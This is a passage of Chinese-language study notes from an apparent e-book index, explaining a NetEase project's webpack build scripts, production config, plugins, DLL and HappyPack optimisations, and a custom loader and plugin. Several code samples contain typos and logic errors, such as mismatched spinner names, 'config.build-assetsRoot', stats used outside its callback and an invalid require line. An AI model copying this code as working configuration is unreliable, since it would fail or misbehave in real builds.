<p>\u4e0d\u540c\u6a21\u5f0f\u4e0b\u5bf9\u5e94\u4e0d\u540c\u7684\u6587\u4ef6\uff1a\u5f00\u53d1\u73af\u5883\u4e0b npm run dev =&gt; dev.config.js\uff1b\u751f\u4ea7\u73af\u5883\u4e0b\u9762npm run build =&gt; prod.config.js\u3002\u5b9e\u9645\u64cd\u4f5c\u65f6\uff0c\u6709\u4e00\u4e2a base.config.js \u662f\u57fa\u7840\u9ed8\u8ba4\u914d\u7f6e\uff0c\u4e0d\u540c\u73af\u5883\u90fd\u4f1a\u6267\u884c\uff0c\u8fd0\u884c\u65f6\u4f1a\u6267\u884c\u591a\u4e2a\u811a\u672c\u3002</p> <p><code>npm run build</code> \u5b9e\u9645\u6267\u884c\u4e86\u4ec0\u4e48\u64cd\u4f5c\uff1f</p> <pre><code>node build.js\n\u5185\u90e8\u811a\u672c\uff1a\u4f7f\u7528 webpack \u6253\u5305\uff08webpack.pro.js\uff09\u8fdb\u884c\u6253\u5305\nwebpack.base.js \u4e0e webpack.pro.js \u5408\u5e76\n\u4ece config \u4e2d\u62ff\u51fa index.js \u548c pro.env \u4e2d\u7684\u73af\u5883\u53d8\u91cf\n</code></pre> <p>package.json</p> <pre><code>{\n  \"author\": \"xxx\",\n    \"scripts\": {\n    \"start\": \"npm run dev\",\n    \"test\": \"npm run unit &amp;&amp; npm run e2e\",\n    \"lint\": \"eslint --ext .js src test/unit test/e2e/specs\",\n    \"build\": \"node build/build.js\",\n    \"build-online\": \"node build/build.js online\",\n    \"css\": \"sass --watch --scss --no-cache --unix-newlines src:src -t compressed\",\n  }\n}\n</code></pre> <p>Build.js \uff08\u8fd9\u662f\u7f51\u6613\u9879\u76ee\u4e2d\u81ea\u5b9a\u4e49\u7684build\u811a\u672c\uff09</p> <pre><code>'use strict';\n\n// \u6267\u884c\u68c0\u67e5\u7248\u672c\u51fd\u6570\nrequire('./check-versions')();\n\n// \u8bbe\u7f6enode\u73af\u5883\u662f\u751f\u4ea7\u73af\u5883\nprocess.env.NODE_ENV = 'production';\n\n// \u9ed8\u8ba4\u7684\u521b\u5efa\u73af\u5883\u662f\u7a7a\nprocess.env.BUILD_MODE = '';\n\n// \u5224\u65ad\u4f20\u53c2\uff1a\u5982\u679c\u4f20\u53c2\u662f\u5728\u7ebf\u6a21\u5f0f\uff0c\u90a3\u4e48\u628a\u521b\u5efa\u73af\u5883\u8bbe\u7f6e\u4e3a\u5728\u7ebf\uff08\u628aterminal\u4e2d\u7684\u53c2\u6570\u53d8\u6210\u5168\u5c40\u53d8\u91cf\u4f7f\u7528\uff09\nif (!!process.argv[2] &amp;&amp; process.argv[2] === 'online') {\n  process.env.BUILD_MODE = 'online';\n}\n\n// \u4e0b\u9762\u662f\u57fa\u672c\u7684\u7b2c\u4e09\u65b9\u5e93\nconst ora = require('ora');\nconst rm = require('rimraf');\nconst path = require('path');\nconst chalk = require('chalk');\nconst webpack = require('webpack');\nconst config = require('../config');\nconst webpackDllConfig = require('./webpack.dll.config');\n\n// \u5f00\u59cb\u52a0\u8f7d loading \u52a8\u753b\nconst snipper = ora('building for production...');\nsnipper.start();\n\n// dll \u6253\u5305\u51fd\u6570\n// webpack \u672c\u8eab\u662f\u4e00\u4e2a\u65b9\u6cd5 webpack(config);\nfunction buildDll() {\n  return new Promise((resolve, reject) =&gt; {\n    // \u4f7f\u7528webpack\u5f00\u59cb\u7f16\u8bd1\uff0c\u7b2c\u4e00\u4e2a\u662f\u914d\u7f6e\u5bf9\u8c61\n    webpack(webpackDllConfig, (err, stats) =&gt; {\n      // \u7f16\u8bd1\u7ed3\u675f\u540e\uff0c\u505c\u6b62loading\n      spinner.stop();\n\n      // \u629b\u51fa\u7f16\u8bd1\u7684\u9519\u8bef\n      if (err) throw err;\n\n      // \u63a7\u5236\u53f0\u8f93\u51fa\u7f16\u8bd1\u7684\u7ed3\u679c\uff08\u914d\u7f6e\uff09\n      process.stdout.write(stats.toString({\n        colors: true,\n        modules: false,\n        children: false, // if ts-loader, it is true\n        chunk: false,\n        chunkModules: false,\n      }) + '\\n\\n');\n\n      // \u5982\u679c\u7f16\u8bd1\u6210\u529f\uff0c\u4f46\u662f\u6709\u9519\u8bef\uff0c\u90a3\u4e48\u663e\u793a\u9519\u8bef\n      if (stats.hasErrors()) {\n        console.log(chalk.red('Build failed with errors.\\n'));\n        // Promise \u629b\u51fa\u62d2\u7edd\uff0c\u9000\u51fa\u8fdb\u7a0b\n        reject();\n        process.exit();\n      }\n\n      // \u5982\u679c\u7f16\u8bd1\u6210\u529f\uff0c\u63d0\u793a\u6210\u529f\u6587\u672c\n      console.log(chalk.cyan('Build complete.\\n'));\n      console.log(chalk.yellow('Tip: build files are meant to be served over an HTTP server.\\n Opening index.html over file:// will not work.\\n'));\n      resolve();\n    });\n  });\n}\n\nfunction buildProject(config) {\n  return new Promise((resolve, reject) =&gt; {\n    webpack(config, (err, stats) =&gt; {\n      spinner.stop();      \n      if (err) throw err;\n      process.stdout.write(stats.toString({\n        colors: true,\n        modules: false,\n        children: false,\n        chunks: false,\n        chunkModules: false,\n      }) + '\\n\\n');\n    });\n    // \u5904\u7406\u5f02\u5e38\u57fa\u672c\u76f8\u540c\n    if (stats.hasErrors()) {\n      console.log(chalk.red('Build failed with errors.\\n'));\n      reject();\n      process.exit(1);\n    }\n    console.log(chalk.cyan('Build complete.\\n'));\n    resolve();\n  });\n}\n\n// \u5220\u9664\u9ed8\u8ba4\u7684dist\u76ee\u5f55\nrm(path.join(config.build.assetsRoot, config.build.assetsSubDirectory), err =&gt; {\n  if (err) throw err;\n  // \u5982\u679c\u662f\u5728\u7ebf\u6a21\u5f0f\n  if (process.env.BUILD_MODE === 'online') {\n    // \u9996\u5148\u7f16\u8bd1DLL\n    buildDll().then(() =&gt; {\n      // \u5f15\u5165\u751f\u4ea7\u73af\u5883\u914d\u7f6e\n      return require('./webpack.prod.conf');\n    })\n      .then((config) =&gt; {\n      // \u4f7f\u7528\u751f\u4ea7\u73af\u5883\u914d\u7f6e\u7f16\u8bd1\u9879\u76ee\n      return buildProject(config);\n    });\n  } else {\n    // \u6d4b\u8bd5\u6a21\u5f0f\n    buildDll().then(() =&gt; {\n      return require('./webpack.test.conf');\n    })\n    .then((config) =&gt; {\n      return buildProject(config);\n    });\n  }\n});\n</code></pre> <p>\u4f7f\u7528\u7b2c\u4e09\u65b9\u63d2\u4ef6\u521b\u5efa\u7684build.js \u4e5f\u5dee\u4e0d\u591a\uff0c@vue/cli \u521b\u5efa\u7684build\u811a\u672c\u3002</p> <p>\u5728\u547d\u4ee4\u884c\u4e2d\u8f93\u5165 webpack config.js \u548c\u6267\u884c node build.js \u5e76\u5728JS\u6587\u4ef6\u4e2d\u4f7f\u7528\u7684\u6548\u679c\u662f\u4e00\u6837\u7684\u3002webpack\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u65b9\u6cd5\u3002</p> <pre><code>const webpack = require('webpack');\nwebpack(config);\n</code></pre> <p>\u6253\u5305\u8fc7\u7a0b\u662f\u5f02\u6b65\u7684\uff0c\u6240\u4ee5\u5148\u8fdb\u884cDLL\u6253\u5305\uff0c\u7136\u540e\u518d\u5f15\u5165\u751f\u4ea7\u73af\u5883\u914d\u7f6e\uff0c\u8fdb\u884c\u4e0b\u4e00\u6b65\u6253\u5305\u3002</p> <p>build \u811a\u672c\uff1a\u5bfc\u5165\u914d\u7f6e\u6587\u4ef6\uff0c\u8c03\u7528webpack\u6253\u5305\u65b9\u6cd5\u8fdb\u884c\u6253\u5305 \u5176\u4ed6\u7684\u811a\u624b\u67b6\u4e2d\u7684build\u811a\u672c\u4e5f\u5f88\u7b80\u5355</p> <p>build.js</p> <pre><code>rm(path.join(config.build.assetsRoot, config.build.assetsSubDirectory), err =&gt; {\n  if (err) {\n    throw err;\n  }\n  webpack(webpackConfig, (err, stats) =&gt; {\n    if (err) {\n      throw err;\n    }\n    process.stdout.write(stats.toString({\n      colors: true,\n      modules: false,\n      children: false,\n      chunks: false,\n      chunkModules: false,\n    }) + '\\n\\n');\n    if (stats.hasError()) {\n      console.log(chalk.red('Build failed with errors'));\n      process.exit(1);\n    }\n    console.log(chalk.cyan('Build complete.'));\n  });\n});\n</code></pre> <p>prod \u811a\u672c\u4e2d\uff0c\u6709\u4e00\u4e2awebpack-merge \u65b9\u6cd5\uff0c\u53ef\u4ee5\u5408\u5e76\u591a\u4e2a\u811a\u672c </p> <p>\u914d\u7f6e\u7684\u672c\u8d28\u5c31\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0cmerge\u5c31\u662f\u5408\u5e76\u591a\u4e2a\u5bf9\u8c61</p> <p>webpack.prod.conf.js</p> <pre><code>const path = require('path');\nconst utils = require('utils');\nconst webpack = require('webpack');\nconst config = require('../config');\nconst merge = require('webpack-merge');\nconst baseWebpackConfig = require('./webpack.base.conf');\nconst CopyWebpackPlugin = require('copy-webpack-plugin');\nconst MiniCssExtractPlugin = require('mini-css-extract-plugin');\n\nconst env = require('../config/prod.env');\n// \u5982\u679c\u6784\u5efa\u6a21\u5f0f\u4e0d\u662fOnline\u6784\u5efa\uff0c\u90a3\u4e48\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u7684\u53d1\u5e03\u73af\u5883\uff0c\u4e3a\u6d4b\u8bd5\u73af\u5883\n\nconst webpackConfig = merge(baseWebpackConfig, {\n  // merge \u65b9\u6cd5\u7528\u4e8e\u5408\u6210\u914d\u7f6e\u6587\u4ef6\uff08\u57fa\u672c\u914d\u7f6e\u548cbuild\u914d\u7f6e\u6587\u4ef6\uff09\n  mode: 'production',\n  module: {\n    rules: utils.styleLoaders({\n      sourceMap: config.build.productionSourceMap,\n      extract: true,\n      usePostCSS: true,\n    })\n  },\n  devtool: false,\n  output: {\n    path: config.build-assetsRoot,\n    filename: utils.aeestsPath('js/[name].[chunkhash].js'),\n    chunkFilename: utils.assetsPath('js/[id].[chunkhash].js')\n  },\n  optimization: {\n    runtimeChunk: {\n      name: 'manifest'\n    },\n    splitChunk: {\n      //\n    }\n  }\n})\n</code></pre>"},{"location":"ebook-netease-senior-frontend/07-%E7%BD%91%E6%98%93%E7%9C%9F%E5%AE%9E%E9%A1%B9%E7%9B%AEwebpack%E9%85%8D%E7%BD%AE%E8%A7%A3%E6%9E%90/#02-loader","title":"02 \u5e38\u7528 loader \u548c\u63d2\u4ef6","text":"<p>\u5e38\u7528\u63d2\u4ef6 plugins\uff0c\u4e0b\u9762\u4f9d\u6b21\u4ecb\u7ecd</p> <ul> <li>webpack.DefinePlugin \u5728\u6253\u5305\u9636\u6bb5\u5b9a\u4e49\u5168\u5c40\u53d8\u91cf</li> <li>webpack.HashedModuledsPlugin \u4fdd\u6301 module.id \u7a33\u5b9a\uff0c\u7b2c\u4e09\u65b9\u5e93\u907f\u514d\u91cd\u590d\u6253\u5305</li> <li>webpack.NoEmitOnErrorsPlugin \u5c4f\u853d\u6253\u5305\u65f6\u7684\u9519\u8bef\uff0c\u6d4f\u89c8\u5668\u53ef\u4ee5\u663e\u793a\u754c\u9762</li> <li>webpack.providePlugin \u63d0\u4f9b\u5e93</li> <li>copy-webpack-plugin \u5e2e\u52a9\u624b\u52a8\u62f7\u8d1d\u5185\u5bb9\uff08\u672a\u6253\u5305\u7684\u5b57\u4f53\u56fe\u6807\u6216\u8005\u56fe\u7247\uff09</li> </ul>"},{"location":"ebook-netease-senior-frontend/07-%E7%BD%91%E6%98%93%E7%9C%9F%E5%AE%9E%E9%A1%B9%E7%9B%AEwebpack%E9%85%8D%E7%BD%AE%E8%A7%A3%E6%9E%90/#webpackdefineplugin","title":"webpack.DefinePlugin","text":"<p>\u6307\u5b9a\u5f53\u524d\u7684\u73af\u5883\u53d8\u91cf\uff08\u6253\u5305\u9636\u6bb5\u5b9a\u4e49\u5168\u5c40\u53d8\u91cf\uff09</p> <p>\u53ef\u4ee5\u4f7f\u7528 webpack --env production \u901a\u8fc7\u547d\u4ee4\u884c\u7684\u5f62\u5f0f\u4f20\u53c2\uff0c\u6216\u8005\u4f7f\u7528\u8fd9\u4e2a\u5bf9\u8c61\u6307\u5b9a\u5f53\u524d\u7684\u73af\u5883\u53d8\u91cf\u662f\u5f00\u53d1\u73af\u5883\u8fd8\u662f\u751f\u4ea7\u73af\u5883\uff0c\u5728\u4e1a\u52a1\u4ee3\u7801\u4e2d\u83b7\u53d6\u5230\u5f53\u524d\u7684\u73af\u5883\u53d8\u91cf\u3002</p> <pre><code>// --env process.env \u65e0\u6cd5\u5728\u4e1a\u52a1\u4ee3\u7801\u4e2d\u62ff\u5230\uff08\u6240\u4ee5\u8981\u521d\u59cb\u5316\u5b9a\u4e49\u73af\u5883\uff0c\u628a\u7528\u6237\u8f93\u5165\u7684\u73af\u5883\u653e\u5728node\u4e2d\uff09\nplugins: [\n  new webpack.DefinePlugin({\n    'process.env': env,\n  }),\n  // \u5b9a\u4e49\u73af\u5883\uff08\u6d4b\u8bd5\u73af\u5883\u8fd8\u662f\u751f\u4ea7\u73af\u5883\uff0c\u4e0d\u9700\u8981\u6bcf\u6b21\u6307\u5b9a\uff0c--env \u6bd4\u8f83\u9ebb\u70e6\uff09\n  new webpack.DllReferencePlugin({\n    context: path.join(__dirname, '..'),\n    manifest: require('./vendor-manifest.json')\n  }),\n  // extract css into its own file\n  new MiniCssExtractPlugin({\n    filename: utils.assetsPath('css/[name].[contenthash].css')\n  }),\n  // keep module.id stable when vender modules does not change\n  new webpack.HashedModuleIdsPlugin(),\n  // webpack \u53ea\u4f1a\u628a\u5904\u7406\u7684\u6a21\u5757\u8fdb\u5165\u6253\u5305\u7ed3\u679c\u3002\n  // enable scope hoisting\n  new webpack.optimize.ModuleConcatenationPlugin(),\n]\n</code></pre> <p>prod.env.js \u7b80\u5316\u7248</p> <pre><code>'use strict';\nmodule.exports = {\n  NODE_ENV: '\"production\"',\n  publish_env: '\"online\"'\n};\n</code></pre> <p>\u7ec3\u4e60</p> <pre><code>plugins: [\n    new webpack.DefinePlugin({\n        'process.env': env\n    }),\n    new UglifyJsPlugin({\n        uglifyOptions: {\n            compress: {\n                warnings: false\n            }\n        },\n        sourceMap: config.build.productionSourceMap,\n        parallel: true\n    }),\n]\n</code></pre> <p>\u63d2\u4ef6\u90fd\u653e\u5728 plugins \u6570\u7ec4\u4e2d\uff0c\u521b\u5efa\u4e00\u4e2a\u63d2\u4ef6\u7684\u5b9e\u4f8b</p>"},{"location":"ebook-netease-senior-frontend/07-%E7%BD%91%E6%98%93%E7%9C%9F%E5%AE%9E%E9%A1%B9%E7%9B%AEwebpack%E9%85%8D%E7%BD%AE%E8%A7%A3%E6%9E%90/#webpackhashedmoduleidsplugin","title":"webpack.HashedModuleIdsPlugin","text":"<p>\u4fdd\u6301\u6a21\u5757\u7684 module.id \u7a33\u5b9a</p> <p>\u5982\u4f55\u5224\u65ad\u4e00\u4e2a\u6587\u4ef6\u662f\u65b0\u7684\u8fd8\u662f\u65e7\u7684\uff08\u6d4f\u89c8\u5668\u8bfb\u53d6\u65b0\u6587\u4ef6\uff0c\u8fd8\u662f\u8bfb\u53d6\u7f13\u5b58\u6587\u4ef6\uff09\uff0c\u5c31\u6839\u636e\u6587\u4ef6\u540e\u9762\u7684hash\u503c\u5224\u65ad\u3002\u6240\u4ee5webpack\u6253\u5305\u8f93\u51fa\u7684\u6587\u4ef6\u4e2d\u5c31\u589e\u52a0\u4e86\u54c8\u5e0c\u503c\u3002</p> <pre><code>const webpackConfig = merge(baseWebpackConfig, {\n  mode: 'production',\n  module: {\n    rules: utils.styleLoaders({\n      sourceMap: config.build.productionSourceMap,\n      extract: true,\n      usePostCSS: true,\n    })\n  },\n  devtool: false,\n  output: {\n    path: config.build.assetsRoot,\n    filename: utils.assetsPath('js/[name].[chunkhash].js'),\n    chunkFilename: utils.assetsPath('js/[id].[chunkhash].js'),\n  },\n  plugins: [\n    // keep module.id stable when vender modules does not change\n    // \u5982\u679cstatic\u8def\u5f84\u4e0b\u9762\u7684\u7b2c\u4e09\u65b9\u5e93\u6587\u4ef6\u6ca1\u6709\u6539\u53d8\uff0c\u90a3\u4e48\u4e0d\u9700\u8981\u91cd\u65b0\u6253\u5305\u8fd9\u90e8\u5206\u4ee3\u7801\n    new webpack.HashedModuleIdsPlugin(),\n\n    // webpack.NoEmitOnErrorsPlugin \u5c4f\u853d\u9519\u8bef\n    new webpack.NoEmitOnErrorsPlugin(),\n  ],\n});\n</code></pre>"},{"location":"ebook-netease-senior-frontend/07-%E7%BD%91%E6%98%93%E7%9C%9F%E5%AE%9E%E9%A1%B9%E7%9B%AEwebpack%E9%85%8D%E7%BD%AE%E8%A7%A3%E6%9E%90/#webpacknoemitonerrorsplugin","title":"webpack.NoEmitOnErrorsPlugin","text":"<p>\u8fd9\u4e2a\u63d2\u4ef6\u5728\u4e0a\u9762\u5df2\u7ecf\u4f7f\u7528\u4e86\u3002\u5982\u679c\u4ee3\u7801\u51fa\u73b0\u95ee\u9898\uff0cwebpack \u9ed8\u8ba4\u4e0d\u4f1a\u7ee7\u7eed\u7f16\u8bd1\uff0c\u663e\u793a\u9519\u8bef\u3002\u8fd9\u4e2a\u63d2\u4ef6\u53ef\u4ee5\u7ee7\u7eed\u7f16\u8bd1\u5e76\u8ba9\u6d4f\u89c8\u5668\u663e\u793a\uff08\u64cd\u4f5c\u66f4\u53cb\u597d\uff09\u3002</p>"},{"location":"ebook-netease-senior-frontend/07-%E7%BD%91%E6%98%93%E7%9C%9F%E5%AE%9E%E9%A1%B9%E7%9B%AEwebpack%E9%85%8D%E7%BD%AE%E8%A7%A3%E6%9E%90/#webpackprovideplugin","title":"webpack.providePlugin","text":"<p>\u5982\u679c\u6211\u4eec\u5728\u5168\u5c40\u4e2d\u4f7f\u7528\u67d0\u4e9b\u5e93\uff0c\u4f8b\u5982jquery\uff0c\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u63d2\u4ef6</p> <p>base.conf.js</p> <p>\u5bf9\u4e8e axios jquery \u7b49\u901a\u7528\u7ec4\u4ef6\uff0c\u6bcf\u4e2a\u7ec4\u4ef6\u90fd\u9700\u8981import\uff0c\u53ef\u4ee5\u53ea\u7528\u8fd9\u4e2a\u63d2\u4ef6\u3002\u76f4\u63a5\u5728\u8fd9\u91cc\u5b9a\u4e49\uff0c\u4e0d\u9700\u8981\u5728\u4e0d\u540c\u7ec4\u4ef6\u4e2d\u5168\u5c40\u5b9a\u4e49\uff0c\u5b9a\u4ee5\u540e\u53ef\u4ee5\u6253\u5305\u5230\u73af\u5883\u4e2d\uff08React\u7b49\u662f\u5426\u53ef\u4ee5\u8fd9\u6837\u4f7f\u7528\uff1f\uff09</p> <pre><code>plugins: [\n  new webpack.ProvidePlugin({\n    Regular: 'Regular',\n    $: 'jquery',\n    axios: 'axios',\n  }),\n  ...utils.htmlPlugin(),\n  new HappyPack({\n    id: 'happybabel',\n    loader: ['babel-loader?cacheDirectory=true'],\n    threadPool: happyThreadPool,\n  }),\n]\n</code></pre>"},{"location":"ebook-netease-senior-frontend/07-%E7%BD%91%E6%98%93%E7%9C%9F%E5%AE%9E%E9%A1%B9%E7%9B%AEwebpack%E9%85%8D%E7%BD%AE%E8%A7%A3%E6%9E%90/#copy-webpack-plugin","title":"copy-webpack-plugin","text":"<p>\u53ef\u4ee5\u5e2e\u52a9\u62f7\u8d1d\u5185\u5bb9</p> <p>\u8fd9\u4e2a\u63d2\u4ef6\u4e0d\u662f\u81ea\u5e26\u7684\uff0c\u9700\u8981\u5b89\u88c5</p> <pre><code>const CopyWebpackPlugin = require('copy-webpack-plugin');\n\nplugins: [\n  // copy-webpack-plugin \u53ef\u4ee5\u5e2e\u52a9\u62f7\u8d1d\u5185\u5bb9\n  // \u76f4\u63a5\u628a\u4e00\u90e8\u5206 static \u7684\u4ee3\u7801\u62f7\u8d1d\u5230\u6253\u5305\u540e\u7684\u76ee\u5f55\u4e2d\uff08\u4e0d\u9700\u8981\u624b\u52a8mv\u547d\u4ee4\uff09\n  // webpack \u53ea\u4f1a\u5904\u7406\u6253\u5305\u7684\u6a21\u5757\uff0c\u4f8b\u5982static\u4e2d\u6709100\u5f20\u56fe\u7247\uff0c\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u63d2\u4ef6\n  new CopyWebpackPlugin([\n    {\n      from: path.resolve(__dirname, '../static'),\n      to: config.dev.assetsSubDirectory,\n      ignore: ['.*'],\n    }\n  ])\n],\n</code></pre>"},{"location":"ebook-netease-senior-frontend/07-%E7%BD%91%E6%98%93%E7%9C%9F%E5%AE%9E%E9%A1%B9%E7%9B%AEwebpack%E9%85%8D%E7%BD%AE%E8%A7%A3%E6%9E%90/#03","title":"03 \u4f18\u5316\u7684\u5185\u5bb9","text":""},{"location":"ebook-netease-senior-frontend/07-%E7%BD%91%E6%98%93%E7%9C%9F%E5%AE%9E%E9%A1%B9%E7%9B%AEwebpack%E9%85%8D%E7%BD%AE%E8%A7%A3%E6%9E%90/#dll","title":"DLL\u4f18\u5316","text":"<pre><code>plugins: [\n  new webpack.DllReferencePlugin({\n    manifest: require(\"./dll/vender-manifest.json\")\n  })\n]\n</code></pre> <p>\u4ec0\u4e48\u662fDLL\u4f18\u5316\uff1f\u6211\u4eec\u9700\u8981\u7528\u7b2c\u4e09\u65b9\u5e93\uff0c\u4e0d\u4f1a\u4fee\u6539\u7b2c\u4e09\u65b9\u5e93\u7684\u5185\u5bb9\uff0c\u6bcf\u6b21webpack\u6253\u5305\u4f1a\u5904\u7406\u7b2c\u4e09\u65b9\u5e93\u4ee3\u7801\u3002\u65e2\u7136\u7b2c\u4e09\u65b9\u5e93\u4ee3\u7801\u4e0d\u53d8\uff0c\u6211\u4eec\u53ef\u4ee5\u5148\u628a\u7b2c\u4e09\u65b9\u5e93\u4ee3\u7801\u5904\u7406\u4e86\uff0c\u653e\u5728\u4e00\u8fb9\uff0c\u7136\u540e\u4e0b\u4e00\u6b21\u6253\u5305\u4e0d\u9700\u8981\u518d\u6b21\u5904\u7406\u8fd9\u90e8\u5206\u4ee3\u7801\uff0c\u76f4\u63a5\u4f7f\u7528\u3002</p> <pre><code>import $ from 'jquery';\nimport _ from 'lodash';\n</code></pre> <p>Webpack.dll.js</p> <pre><code>const webpack = require('webpack');\nmodule.exports = {\n  entry: {\n    vender:['jquery', 'lodash']\n  },\n  output: {\n    path: __dirname + '/dll',\n    filename: '[name].dll.js',\n    library: '[name]_library'\n  },\n  plugins: [\n    new webpack.DllPlugin({\n      path: __dirname + '/dll/[name]-manifest.json',\n      name: '[name]_library'\n    })\n  ]\n};\n</code></pre> <p>bash \u6253\u5305\u7b2c\u4e09\u65b9\u5e93</p> <pre><code>webpack --config webpack.dll.js\n</code></pre> <p>\u8f93\u51fa vender.dll.js</p> <p>\u7136\u540e\u5728webpack\u914d\u7f6e\u6587\u4ef6\u4e2d\u589e\u52a0\u8fd9\u4e2a\u6587\u4ef6</p> <pre><code>plugins: [\n  new webpack.DllReferencePlugin({\n    manifest: require(\"./dll/vender-manifest.js\")\n  })\n]\n</code></pre> <p>webpack \u7ee7\u7eed\u6253\u5305</p>"},{"location":"ebook-netease-senior-frontend/07-%E7%BD%91%E6%98%93%E7%9C%9F%E5%AE%9E%E9%A1%B9%E7%9B%AEwebpack%E9%85%8D%E7%BD%AE%E8%A7%A3%E6%9E%90/#happypack","title":"HappyPack","text":"<pre><code>const happyPack = require('happypack');\n// \u914d\u7f6e\u8fde\u63a5\u6c60\uff0c\u5bb9\u91cf\u7b49\u4e8eCPU\u7684\u4e2a\u6570\uff08\u9002\u5408\u591a\u6838CPU\u5e76\u884c\u6253\u5305\uff09\nconst happyThreadPool = HappyPack.ThreadPool({size: os.cpus().length});\n\nmodule: {\n  rules: [\n    {\n      test: /\\.js$/,\n      use: [\n        {\n          loader: 'happypack/loader?id=happybabel'\n        }\n      ]\n    }\n  ]\n},\nplugins: [\n  new HappyPack({\n    // \u8fd9\u91cc\u7684ID\u548c\u4e0a\u9762\u7684ID\u5fc5\u987b\u76f8\u540c\uff0c\u5426\u5219\u62a5\u9519\n    id: 'happybabel',\n    loaders: ['babel-loader?cacheDirectory=true'],\n    threadPool: happyThreadPool,\n  }),\n  // \u652f\u6301\u5176\u4ed6\u7c7b\u578b\u6587\u4ef6\u7684\u7f16\u8bd1\n  new HappyPack({\n    // \u8fd9\u91cc\u7684ID\u548c\u4e0a\u9762\u7684ID\u5fc5\u987b\u76f8\u540c\uff0c\u5426\u5219\u62a5\u9519\n    id: 'happybabel',\n    loaders: ['scss-loader?cacheDirectory=true'],\n    threadPool: happyThreadPool,\n  })\n]\n</code></pre> <p>\u5982\u679c\u9879\u76ee\u8f83\u5c0f\uff0c\u6253\u5305\u7f16\u8bd1\u7684\u65f6\u95f4\u53cd\u800c\u66f4\u591a</p> <p>\u56e0\u4e3a\u8fd9\u91cc\u4f7f\u7528\u591a\u8fdb\u7a0b\uff0c\u8c03\u7528\u8fdb\u7a0b\u4e5f\u6d88\u8017\u65f6\u95f4\uff1b \u6240\u4ee5\u6587\u4ef6\u7ec4\u4ef6\u8f83\u5c11\u65f6\uff0c\u4f7f\u7528Happypack \u53ef\u80fd\u589e\u52a0\u6253\u5305\u65f6\u95f4\u3002 \u5982\u679c\u4f7f\u7528\u51e0\u767e\u4e2a\u7ec4\u4ef6\uff0c\u90a3\u4e48\u4f7f\u7528\u8fd9\u4e2a\u53ef\u4ee5\u8282\u7701\u5f88\u591a\u4e8b\u4ef6 \u8fd9\u662f\u4e00\u4e2a\u7b2c\u4e09\u65b9\u5e93\uff0c\u9700\u8981\u5355\u72ec\u5b89\u88c5\u5230dev\u4e2d</p> <p>\u53ef\u4ee5\u4f7f\u7528\u8fd9\u6837\u7684\u5927\u9879\u76ee\u6d4b\u8bd5\u4e00\u4e0b\u7f16\u8bd1\u7684\u65f6\u95f4</p>"},{"location":"ebook-netease-senior-frontend/07-%E7%BD%91%E6%98%93%E7%9C%9F%E5%AE%9E%E9%A1%B9%E7%9B%AEwebpack%E9%85%8D%E7%BD%AE%E8%A7%A3%E6%9E%90/#03-webpack","title":"03 webpack \u4e2d\u5e38\u89c1\u95ee\u9898","text":"<p>\u5982\u679c\u5bf9\u6a21\u5757\u5185\u5bb9\u8fdb\u884c\u5904\u7406\uff1aloader \u662f\u9996\u9009\u65b9\u6848\uff1b</p> <p>\u5982\u679c\u8981\u52a0\u5165\u7279\u6b8a\u7684\u529f\u80fd\uff1a\u53ef\u4ee5\u81ea\u5b9a\u4e49\u589e\u52a0\u63d2\u4ef6 plugin\uff1b</p> <p>\u9879\u76ee\u4e2d\u6253\u5305\u7b80\u5316\uff1a\u53ef\u53d8\u6027\u914d\u7f6e\uff1a\u901a\u8fc7\u7f16\u5199\u54cd\u5e94\u7684\u64cd\u4f5c\u51fd\u6570\uff1b</p> <p>Myloader.js \u81ea\u5b9a\u4e49\u589e\u52a0\u63d2\u4ef6\uff08\u4f7f\u7528\u6b63\u5219\u66ff\u6362\u4ee3\u7801\u4e2d\u7684\u5b57\u7b26\uff0c\u7c7b\u4f3c\u4e8eAST\uff0c\u62bd\u8c61\u8bed\u6cd5\u6811\uff09\u5f00\u53d1\u7684\u65f6\u5019\uff0c\u6211\u4eec\u4f7f\u7528static\u4e2d\u7684\u56fe\u7247\uff0c\u751f\u4ea7\u73af\u5883\u4e2d\u9700\u8981\u4f7f\u7528 www.baidu.com \u4e2d\u7684\u56fe\u7247\uff0c\u6240\u4ee5\u53ef\u4ee5\u81ea\u5b9a\u4e49\u4e00\u4e2a\u63d2\u4ef6\u66ff\u6362\u5f00\u53d1\u73af\u5883\u4e2d\u7684\u53d8\u91cf\u3002</p> <pre><code>module.exports = function(context) {\n  context.replace('bind', 'on');\n  return context;\n}\n</code></pre> <p>\u4f7f\u7528</p> <pre><code>const require('./myplugin');\n\nmodule: {\n  rules: [\n    {\n      test: /\\.js$/,\n      // loader: 'babel-loader'\n      use: [\n        { loader: 'babel-loader' },\n        { loader: './myloader.js' },\n      ]\n    }\n  ]\n}\n</code></pre> <p>index.js \u63d2\u4ef6\u5c31\u662f\u76d1\u542cwebpack\u7684\u751f\u547d\u5468\u671f\u51fd\u6570\uff0c\u5e76\u5728\u5408\u9002\u7684\u65f6\u5019\u5904\u7406\u4ee3\u7801</p> <pre><code>const fs = require('fs');\nconst path = require('path');\nmodule.exports = a;\nfunction a () {\n\n}\na.prototype.apply = function(compiler) {\n  compiler.hooks.done.tap('changeStitic', function(compilation) {\n    let context = compiler.options.context;\n    let publickPath = path.resolve(context, 'dist');\n    compilation.toJson().assets.forEach((ast) =&gt; {\n      const filePath = path.resolve(publickPath, ast.name);\n      fs.readFile(filepath, function(err, file) {\n        var newcontext = file.toString().replace('./static', 'www.baidu.com');\n        fs.writeFile(filePath, newcontext, function() {})\n      });\n    })\n  })\n}\n</code></pre> <p>make \u5468\u671f\u9700\u8981\u5904\u7406\u5f88\u591a\u7f16\u8bd1\u7684\u914d\u7f6e\uff0c\u65b0\u624b\u4e0d\u597d\u505a\uff0cdone \u5468\u671f\u76f4\u63a5\u64cd\u4f5c\u7f16\u8bd1\u540e\u7684\u6587\u4ef6\uff0c\u76f8\u5bf9\u7b80\u5355</p> <p>loader \u662f\u5bf9\u67d0\u4e00\u7c7b\u6587\u4ef6\u8fdb\u884c\u5904\u7406\uff08css-loader sass-loader\uff09</p> <p>plugin \u662f\u76d1\u542c\u5230 webpack 